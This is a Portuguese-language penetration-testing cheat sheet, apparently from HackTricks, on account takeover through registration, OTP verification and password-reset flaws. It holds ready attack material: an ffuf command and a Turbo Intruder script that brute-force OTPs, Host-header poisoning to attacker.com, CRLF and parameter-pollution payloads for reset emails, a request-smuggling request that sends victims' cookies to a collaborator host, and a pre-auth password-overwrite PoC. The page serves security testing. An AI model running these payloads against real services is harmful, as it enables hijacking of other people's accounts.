# Registro e Vulnerabilidades de Apropriação de Conta

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Tente gerar usando um username existente
- Experimente variar o email:
- maiúsculas
- +1@
- adicione algum ponto no email
- caracteres especiais no nome do email (%00, %09, %20)
- Coloque caracteres em branco após o email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Tente truques de canonicalization do provedor de email (dependente do serviço):
- Gmail ignora pontos e subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` entregam para `victim@gmail.com`
- Alguns provedores são insensíveis a maiúsculas/minúsculas na parte local
- Alguns provedores aceitam unicode confusables. Tente homoglyphs e soft hyphen `\u00AD` dentro da parte local
- Abuse isso para: contornar checagens de unicidade, obter contas duplicadas/invites de workspace, ou bloquear registros da vítima (DoS temporário) enquanto prepara uma takeover

### Username Enumeration

Verifique se é possível descobrir quando um username já foi registrado dentro da aplicação.

- Mensagens de erro diferentes ou códigos de status HTTP
- Diferenças de timing (usuário existente pode disparar lookup para IdP/DB)
- Autopreenchimento do formulário de registro com dados de perfil para emails conhecidos
- Verifique fluxos de equipe/invite: inserir um email pode revelar se uma conta existe

### Password Policy

Ao criar um usuário, verifique a política de senhas (veja se é possível usar senhas fracas). Nesse caso você pode tentar bruteforce nas credenciais.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)para aprender como tentar account takeovers ou extrair informação via **SQL Injections** em formulários de registro.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Quando registrado, tente alterar o email e verifique se essa mudança é validada corretamente ou se é possível alterá-lo para emails arbitrários.

### More Checks

- Verifique se é possível usar **disposable emails** (mailinator, yopmail, 1secmail, etc.) ou contornar a blocklist com subaddressing como `victim+mailinator@gmail.com`
- **Senha** **longa** (>200) leva a **DoS**
- Verifique os rate limits na criação de contas
- Use username@**burp_collab**.net e analise o **callback**
- Se verificação por número de telefone for usada, verifique casos de borda no parsing/injection de telefone

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Verificação Fraca de Email/Telefone (OTP/Magic Link)

Fluxos de registro frequentemente verificam propriedade via um OTP numérico ou um token de magic-link. Falhas típicas:

- OTP previsível ou curto (4–6 dígitos) sem rate limiting efetivo ou rastreamento por IP/dispositivo. Tente tentativas paralelas e rotação de headers/IP.
- Reuso de OTP entre ações ou contas, ou não vinculado ao usuário/ação específicos (ex.: mesmo código funciona para login e signup, ou funciona após alteração do email).
- Multi-value smuggling: alguns backends aceitam múltiplos códigos e verificam se algum corresponde. Tente:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguir códigos errados vs expirados vs usuário-incorreto por status/mensagem/tamanho do corpo.
- Tokens não invalidados após sucesso ou após alteração de senha/email.
- Token de verificação não vinculado ao user agent/IP permitindo conclusão cross-origin a partir de páginas controladas pelo atacante.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Adivinhação paralela/concorrente para contornar bloqueios sequenciais (use Turbo Intruder no Burp):

<details>
<summary>Snippet do Turbo Intruder para inundar tentativas de OTP de 6‑dígitos</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submeta o mesmo OTP válido simultaneamente em duas sessões; às vezes uma sessão se torna uma conta do atacante verificada enquanto o fluxo da vítima também tem sucesso.
- Também teste Host header poisoning em verification links (o mesmo que reset poisoning abaixo) para leak ou completar a verificação em um host controlado pelo atacante.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Uma classe poderosa de problemas ocorre quando um atacante realiza ações no e-mail da vítima antes que a vítima crie a conta, e depois recupera o acesso.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Atacante: registra uma conta classic com o e-mail da vítima e define uma senha
- Vítima: depois se registra via SSO (mesmo e-mail)
- Mesclagens inseguras podem deixar ambas as partes autenticadas ou ressuscitar o acesso do atacante
- Unexpired Session Identifier
- Atacante: cria conta e mantém uma sessão de longa duração (não faça logout)
- Vítima: recupera/define senha e usa a conta
- Teste se sessões antigas permanecem válidas após reset ou habilitação de MFA
- Trojan Identifier
- Atacante: adiciona um identificador secundário à conta pré-criada (telefone, e-mail adicional, ou vincula o IdP do atacante)
- Vítima: redefine senha; o atacante depois usa o trojan identifier para resetar/logar
- Unexpired Email Change
- Atacante: inicia alteração de e-mail para o e-mail do atacante e retém a confirmação
- Vítima: recupera a conta e começa a usá‑la
- Atacante: depois completa a alteração de e-mail pendente para roubar a conta
- Non‑Verifying IdP
- Atacante: usa um IdP que não verifica a propriedade do e-mail para afirmar `victim@…`
- Vítima: registra‑se via rota classic
- O serviço mescla com base no e-mail sem checar `email_verified` ou realizar verificação local

Practical tips

- Colete fluxos e endpoints a partir dos bundles web/mobile. Procure por classic signup, SSO linking, email/phone change e endpoints de password reset.
- Crie automação realista para manter sessões ativas enquanto você testa outros fluxos.
- Para testes de SSO, suba um provedor OIDC de teste e emita tokens com claims `email` para o endereço da vítima e `email_verified=false` para checar se o RP confia em IdPs não verificados.
- Após qualquer password reset ou email change, verifique que:
  - todas as outras sessões e tokens deixam de ser válidos,
  - as alterações pendentes de e-mail/telefone são canceladas,
  - IdPs/e-mails/telefones previamente vinculados são re‑verificados.

Nota: Metodologia extensa e estudos de caso dessas técnicas são documentados pela pesquisa pre‑hijacking da Microsoft (veja Referências no fim).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicite password reset para seu endereço de e-mail
2. Clique no password reset link
3. Não altere a senha
4. Clique em qualquer site de terceiros (ex.: Facebook, twitter)
5. Intercepte a requisição no Burp Suite proxy
6. Verifique se o referer header está leaking o password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepte a requisição de password reset no Burp Suite
2. Adicione ou edite os seguintes headers no Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Reencaminhe a requisição com o header modificado\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Procure por uma password reset URL baseada no _host header_ como : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR em parâmetros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. O atacante precisa fazer login com sua conta e ir para a funcionalidade **Alterar senha**.
2. Start the Burp Suite and Intercept the request
3. Send it to the repeater tab and edit the parameters : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token de redefinição de senha fraco <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

O token de redefinição de senha deve ser gerado aleatoriamente e único a cada vez.\
Tente determinar se o token expira ou se é sempre o mesmo; em alguns casos o algoritmo de geração é fraco e pode ser adivinhado. As seguintes variáveis podem ser usadas pelo algoritmo.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Dispare uma solicitação de password reset usando a API/UI para um email específico e.g: test@mail.com
2. Inspecione a resposta do servidor e verifique por `resetToken`
3. Em seguida use o token em uma URL como `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Redefinição de senha via colisão de nome de usuário <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registre-se no sistema com um username idêntico ao da vítima, mas com espaços em branco inseridos antes e/ou depois do nome de usuário. e.g: `"admin "`
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim password.
4. Connect to the victim account with the new password.

A plataforma CTFd foi vulnerável a este ataque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encontre um XSS dentro da aplicação ou em um subdomínio se os cookies estiverem escopados para o domínio pai : `*.domain.com`
2. Leak the current **sessions cookie**
3. Autentique-se como o usuário usando o cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` with the goal of open redirect the victims to burpcollab and steal their cookies\
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Relatórios do HackerOne sobre a exploração deste bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Tomada de conta via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Criar um payload para o CSRF, e.g: “HTML form with auto submit for a password change”
2. Enviar o payload

### Tomada de conta via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token pode ser usado para autenticar um usuário.

- Editar o JWT com outro User ID / Email
- Verificar assinatura JWT fraca


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Alguns signup handlers realizam um upsert quando o email fornecido já existe. Se o endpoint aceita um corpo mínimo contendo email e password e não exige verificação de propriedade, enviar o email da vítima sobrescreverá a senha dela antes da autenticação (pre-auth).

- Descoberta: coletar nomes de endpoint a partir do JS empacotado (ou do tráfego de app móvel), depois fuzzar base paths como /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Dicas do método: um GET retornando mensagens como "Only POST request is allowed." frequentemente indica o verbo correto e que um corpo JSON é esperado.
- Corpo mínimo observado na prática:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Exemplo de PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impacto: Full Account Takeover (ATO) sem qualquer reset token, OTP, ou email verification.

## Referências

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
